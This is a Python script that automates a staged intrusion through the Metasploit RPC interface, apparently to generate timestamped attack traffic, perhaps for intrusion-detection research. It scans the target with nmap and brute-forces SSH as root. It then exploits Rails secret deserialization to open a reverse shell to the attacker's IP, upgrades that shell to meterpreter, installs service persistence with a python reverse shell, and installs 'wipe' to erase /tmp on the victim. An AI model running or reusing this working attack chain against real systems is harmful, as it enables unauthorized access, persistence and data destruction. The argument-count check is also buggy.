import time
import sys
import os
from nmap import nmap
from pymetasploit3.msfrpc import MsfRpcClient



################################ timestamp generator ################################
def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())



def main(argv):
    # check total numbers of arguments given
    if len(argv) != 3:
        print("Number of arguments incorrect, please provide "+len(argv)+" arguments")
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
    else:
        pass
    
    
    # variables initialization
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    wipe_disk_folder = "/tmp"
    
    # metasploit services initialization
    client = MsfRpcClient('kali')
    
    
    ################################ Step 1 Block ################################
    output_time_file_start = 'time_step_1_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments='-O -A -p 0-65535')
    except Exception as e:
        print(e)
        pass

    time.sleep(60)
    output_time_file_end = 'time_step_1_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(10)
    ################################ Step 1 Block ################################
    
    ################################ Step 2 Block ################################
    output_time_file_start = 'time_step_2_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
        auxiliary['USERNAME'] = "root"
        auxiliary['RHOSTS'] = target_ip
        auxiliary['RPORT'] = 22
        auxiliary['VERBOSE'] = True

        auxiliary.execute()
        print(client.jobs.list)
        while client.jobs.list:
            time.sleep(1)
    except Exception as e:
        print(e)
        pass

    time.sleep(60)
    output_time_file_end = 'time_step_2_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(2)
    ################################ Step 2 Block ################################

################################ Step 3 Block ################################
    output_time_file_start = 'time_step_3_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
        payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')

        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 8181
        exploit['TARGETURI'] = '/'
        exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
        payload['LHOST'] = my_ip
        payload['LPORT'] = 4444

        exploit.execute(payload=payload)

        while client.jobs.list:
            time.sleep(1)

        exploit = client.modules.use('post', 'multi/manage/shell_to_meterpreter')
        exploit['SESSION'] = 1
        exploit.execute()

        while client.jobs.list:
            time.sleep(1)
    except Exception as e:
        print(e)
        pass

    time.sleep(60)
    output_time_file_end = 'time_step_3_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(2)
    ################################ Step 3 Block ################################
    
    ################################ Step 4 Block ################################
    output_time_file_start = 'time_step_4_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        exploit = client.modules.use('exploit', 'linux/local/service_persistence')
        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
        exploit['SESSION'] = 2
        exploit['VERBOSE'] = True
        payload['LHOST'] = my_ip

        exploit.execute(payload=payload)

        while client.jobs.list:
            time.sleep(1)

        client.sessions.session('1').stop()
        client.sessions.session('2').stop()
        client.sessions.session('3').stop()
    except Exception as e:
        print(e)
        pass

    time.sleep(60)
    output_time_file_end = 'time_step_4_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(2)
    ################################ Step 4 Block ################################
    
    ################################ Step 5 Block ################################
    output_time_file_start = 'time_step_5_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        exploit = client.modules.use('exploit', 'multi/handler')
        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
        payload['LHOST'] = my_ip

        exploit.execute(payload=payload)

        while client.jobs.list:
            time.sleep(20)

        time.sleep(30)
    except Exception as e:
        print(e)
        pass

    time.sleep(60)
    output_time_file_end = 'time_step_5_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(2)
    ################################ Step 5 Block ################################
    
    ################################ Step 6 Block ################################
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        shell = client.sessions.session('4')
        shell.write('apt install wipe -y')
        time.sleep(30)
        shell.write("wipe -f {0}".format(wipe_disk_folder))

        while client.jobs.list:
            time.sleep(1)
    
    except Exception as e:
        print(e)
        pass

    ################################ Step 6 Block ################################


main(sys.argv)